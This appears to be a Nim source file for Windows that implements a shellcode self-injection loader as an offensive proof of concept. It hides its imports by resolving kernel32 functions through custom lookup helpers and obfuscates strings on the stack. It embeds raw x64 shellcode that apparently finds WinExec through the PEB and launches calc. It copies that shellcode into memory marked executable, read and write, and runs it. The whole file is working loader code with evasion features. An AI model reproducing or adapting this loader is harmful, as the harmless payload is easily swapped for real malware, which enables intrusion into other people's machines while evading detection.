import 
    winim,
    utils/[gpa, gmh, hash, stdio, stackstr]

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc main(): int {.exportc: "Main".} =
  var 
    hKernel32 = gmh("KERNEL32.DLL")
    pHeapAlloc = gpa(hKernel32, "HeapAlloc", HeapAlloc)
    pGetProcessHeap = gpa(hKernel32, "GetProcessHeap", GetProcessHeap)
    pVirtualAlloc = gpa(hKernel32, "VirtualAlloc", winbase.VirtualAlloc)
    pGetLastError = gpa(hKernel32, "GetLastError", GetLastError)
    testString {.stackStringA.} = "Test String Data"

  let shellc: array[173, byte] = [byte 0x55, 0x48, 0x8B, 0xEC, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x33, 0xC0, 0x48, 0x33, 0xDB, 0x48, 0x33, 0xC9, 0x48, 0x33, 0xD2, 0x48, 0x33, 0xFF, 0x48, 0x33, 0xC0, 0x65, 0x48, 0x8B, 0x40, 0x60, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x40, 0x20, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x00, 0x48, 0x8B, 0x58, 0x20, 0x8B, 0x4B, 0x3C, 0x48, 0x03, 0xCB, 0x8B, 0x89, 0x88, 0x00, 0x00, 0x00, 0x48, 0x03, 0xCB, 0x8B, 0x51, 0x20, 0x48, 0x03, 0xD3, 0x8B, 0x79, 0x24, 0x48, 0x03, 0xFB, 0x8B, 0x49, 0x1C, 0x48, 0x03, 0xCB, 0x48, 0x33, 0xC0, 0x49, 0xB8, 0x57, 0x69, 0x6E, 0x45, 0x78, 0x65, 0x63, 0x00, 0x48, 0x33, 0xF6, 0x8B, 0x34, 0x82, 0x48, 0x03, 0xF3, 0x48, 0x8B, 0x36, 0x4C, 0x3B, 0xC6, 0x74, 0x05, 0x48, 0xFF, 0xC0, 0xEB, 0xEA, 0x4D, 0x33, 0xC0, 0x4D, 0x33, 0xC9, 0x66, 0x44, 0x8B, 0x04, 0x47, 0x46, 0x8B, 0x0C, 0x81, 0x49, 0x03, 0xD9, 0xC6, 0x45, 0xE0, 0x63, 0xC6, 0x45, 0xE1, 0x61, 0xC6, 0x45, 0xE2, 0x6C, 0xC6, 0x45, 0xE3, 0x63, 0xC6, 0x45, 0xE4, 0x00, 0x48, 0xC7, 0xC2, 0x05, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xE0, 0xFF, 0xD3, 0x48, 0x8B, 0xE5, 0x5D, 0xC3]
  
  PRINTA("[!] Executing self-injection routine!")
  var buffer = pVirtualAlloc(NULL, shellc.len, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
  moveMem(buffer, shellc[0].addr, shellc.len)
  let f = cast[proc(){.nimcall.}](buffer)
  f()
  PRINTA("\n[+] Success!")

  #PRINTA("[+] HeapAlloc: %p\n".cstring, cast[int](pHeapAlloc))
  #PRINTA("[+] GetProcessHeap: %p\n".cstring, cast[int](pGetProcessHeap))

  var hProcHeap = pGetProcessHeap()
  #PRINTA("[!] GetLastError after GetProcessHeap: %i\n".cstring, pGetLastError())

  var p = pHeapAlloc(pGetProcessHeap(), 0, 0x1000)
  #PRINTA("[!] GetLastError after HeapAlloc: %i\n".cstring, pGetLastError())
  #PRINTA("[+] Heap ptr: %p\n".cstring, cast[int](p))

  #var test = "Test String Data\0".cstring
  #copyMem(p, test[0].addr, strlenA(cast[int](test[0].addr)))

  PRINTA(cast[cstring](testString[0].addr))
  return 0

proc start() {.asmNoStackframe, codegenDecl: "__attribute__((section (\".text\"))) $# $#$#", exportc: "start".} =
  asm """
    and rsp, 0xfffffffffffffff0
    sub rsp, 0x10
    call Main
    add rsp, 0x10
    ret
  """

when isMainModule:
  start()
